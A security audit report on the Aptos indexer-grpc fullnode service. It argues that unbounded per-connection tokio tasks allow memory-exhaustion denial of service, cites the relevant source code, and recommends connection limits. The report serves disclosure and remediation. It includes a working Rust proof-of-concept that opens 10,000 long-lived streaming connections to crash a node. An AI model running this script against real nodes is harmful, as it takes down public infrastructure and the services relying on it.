# Audit Report

## Title
Unbounded Task Spawning in Indexer gRPC Service Enables Memory Exhaustion Attack

## Summary
While `spawn_named_runtime()` creates a bounded thread pool (CPU cores for worker threads, 64 for blocking threads), the indexer-grpc service spawns unlimited tokio tasks for concurrent client connections without any connection limiting, enabling attackers to exhaust node memory through unbounded task allocation. [1](#0-0) 

## Finding Description

The `spawn_named_runtime()` function creates a bounded tokio runtime: [2](#0-1) 

Worker threads default to CPU core count when `num_worker_threads` is `None`, and blocking threads are capped at 64. [3](#0-2) 

However, the bounded thread pool does NOT prevent resource exhaustion. Each incoming gRPC connection spawns an unbounded tokio task: [4](#0-3) 

The tonic Server has no connection limiting, rate limiting, or authentication: [5](#0-4) 

The configuration provides no connection limits: [6](#0-5) 

Each spawned task allocates substantial memory:
- Channel buffer with `transaction_channel_size` slots (default 35)
- `IndexerStreamCoordinator` state
- `MovingAverage` tracker with 10,000 entries
- Context and other buffers [7](#0-6) 

The `LocalnetDataService` has the same vulnerability but spawns TWO tasks per connection: [8](#0-7) [9](#0-8) 

**Attack Path:**
1. Attacker opens thousands of concurrent gRPC connections to indexer-grpc service
2. Each connection spawns 1-2 long-lived tokio tasks
3. While worker threads are bounded, tokio queues unlimited tasks on those threads
4. Memory consumption grows linearly with connection count
5. Node eventually hits OOM and crashes or becomes unresponsive

## Impact Explanation

This qualifies as **High Severity** under "API crashes" per the bug bounty program. The indexer-grpc service is a public-facing API that can be crashed through memory exhaustion, causing:

- **Fullnode unavailability**: Indexers cannot sync transaction data
- **Ecosystem disruption**: External services depending on indexer data fail
- **Validator risk (if enabled)**: If validators run this service, memory exhaustion could degrade validator performance

The attack requires no authentication, minimal resources from the attacker (simple gRPC client), and has high impact on node availability.

## Likelihood Explanation

**Likelihood: HIGH**

- Service is publicly exposed without authentication
- Attack is trivial to execute (basic gRPC client opening many connections)
- No rate limiting or connection caps exist
- Default configuration is vulnerable
- Many fullnodes run this service to support the indexer ecosystem

## Recommendation

Implement connection concurrency limits at the tonic Server level:

```rust
// In runtime.rs, add connection limiting:
use tower::limit::ConcurrencyLimit;

const MAX_CONCURRENT_CONNECTIONS: usize = 100;

let router = match use_data_service_interface {
    false => {
        let svc = ConcurrencyLimit::new(
            FullnodeDataServer::new(server)
                .send_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Gzip),
            MAX_CONCURRENT_CONNECTIONS
        );
        tonic_server.add_service(svc)
    },
    // Similar for true case
};
```

Additionally, add configuration option in `IndexerGrpcConfig`:
```rust
pub max_concurrent_connections: Option<usize>,
```

Consider also implementing:
- Per-IP rate limiting
- Connection timeouts for idle streams
- Authentication for production deployments

## Proof of Concept

```rust
// PoC: Spawn many concurrent connections to exhaust memory
use tonic::transport::Channel;
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target_url = "http://127.0.0.1:50051";
    let num_connections = 10000;
    
    let mut handles = vec![];
    
    for i in 0..num_connections {
        let url = target_url.to_string();
        let handle = tokio::spawn(async move {
            let channel = Channel::from_shared(url)
                .unwrap()
                .connect()
                .await
                .unwrap();
            
            let mut client = FullnodeDataClient::new(channel);
            
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: Some(u64::MAX), // Request all transactions
            };
            
            // Keep stream open indefinitely
            let mut stream = client
                .get_transactions_from_node(request)
                .await
                .unwrap()
                .into_inner();
            
            // Hold connection open
            while let Some(_response) = stream.message().await.unwrap() {
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
            }
        });
        
        handles.push(handle);
    }
    
    // Memory will grow unbounded as tasks accumulate
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

Running this against a fullnode with default configuration will cause memory to grow proportionally to the number of connections until OOM occurs.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L48-48)
```rust
    let runtime = aptos_runtimes::spawn_named_runtime("indexer-grpc".to_string(), None);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-130)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
            true => {
                let svc = RawDataServer::new(localnet_data_server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
        };

        let listener = TcpListener::bind(address).await.unwrap();
        if let Some(port_tx) = port_tx {
            port_tx.send(listener.local_addr().unwrap().port()).unwrap();
        }
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();

        // Make port into a config
        router.serve_with_incoming(incoming).await.unwrap();
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-27)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;
```

**File:** crates/aptos-runtimes/src/lib.rs (L40-54)
```rust
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
        .enable_all();
    if let Some(num_worker_threads) = num_worker_threads {
        builder.worker_threads(num_worker_threads);
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L94-101)
```rust
        let (tx, rx) = mpsc::channel(transaction_channel_size);

        // Creates a moving average to track tps
        let mut ma = MovingAverage::new(10_000);

        let abort_handle = self.abort_handle.clone();
        // This is the main thread handling pushing to the stream
        tokio::spawn(async move {
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/localnet_data_service.rs (L77-77)
```rust
        tokio::spawn(async move {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/localnet_data_service.rs (L111-111)
```rust
        tokio::spawn(async move {
```
